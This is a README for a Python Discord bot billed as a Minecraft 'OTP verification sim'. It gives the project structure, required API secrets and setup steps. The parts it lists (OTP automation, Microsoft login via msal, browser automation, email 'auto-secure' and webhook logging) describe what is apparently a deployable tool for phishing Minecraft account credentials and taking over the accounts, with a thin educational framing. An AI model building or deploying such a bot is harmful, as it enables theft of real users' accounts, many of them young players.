# Minecraft OTP Discord Verification Sim

## Overview
A Python Discord bot that simulates social engineering / account verification flows for educational and ethical cybersecurity research purposes. It demonstrates how deceptive user interfaces can trick users into sharing account information.

## Project Structure
- `bot.py` - Main bot entry point, defines `PhobosBot` class
- `config.py` - Configuration file, loads credentials from environment variables
- `cogs/` - Discord command cogs
  - `admin.py` - Admin commands (reload, sync)
  - `my_cog.py` - Main bot commands (webhook, otp)
- `views/` - Discord UI components (buttons, modals, OTP automation)
- `data.json` - Persistent webhook/data storage

## Setup & Configuration

### Required Secrets
- `DISCORD_TOKEN` - Discord bot token (required)
- `HYPIXEL_API_KEY` - Hypixel API key (optional, for stats)
- `MAILSLURP_API_KEY` - MailSlurp API key (optional, for auto-secure email)

### Running the Bot
The bot runs via the "Start application" workflow using `python bot.py`.

### First-Time Setup in Discord
1. Invite the bot to your server with all intents enabled
2. Run `!sync global` to register slash commands
3. Use `/webhook` to configure the log destination

## Dependencies
- `discord.py` - Discord API wrapper
- `jishaku` - Bot debugging extension
- `msal` - Microsoft Authentication Library
- `playwright` - Browser automation
- `mailslurp_client` - Email API client
- `beautifulsoup4` - HTML parsing
- `requests` - HTTP requests
